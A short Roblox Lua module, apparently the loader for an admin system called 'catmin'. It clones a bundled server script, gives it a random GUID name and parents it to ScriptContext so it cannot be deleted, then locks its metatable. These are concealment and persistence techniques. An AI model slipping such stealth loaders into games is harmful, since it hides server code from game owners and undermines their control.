local proxy = newproxy(true) -- Create new proxy with a metatable
local mt = getmetatable(proxy) -- Get the metatable from that proxy

-- Define a function that will be called when the module is called

mt.__call = function (_ --[[self]], config)
    local ServerScript = script:FindFirstChildWhichIsA("Script"):Clone()
    ServerScript.Name = game:GetService("HttpService"):GenerateGUID(false) -- Generate GUID for name of Server Script
    ServerScript.Disabled = false -- Enable the script
    ServerScript.Parent = game:GetService("ScriptContext") -- Parent it to ScriptContext preventing deletion using the new RunContext feature
end

mt.__metatable = 'catmin module' -- Lock the metatable to prevent tampering

return proxy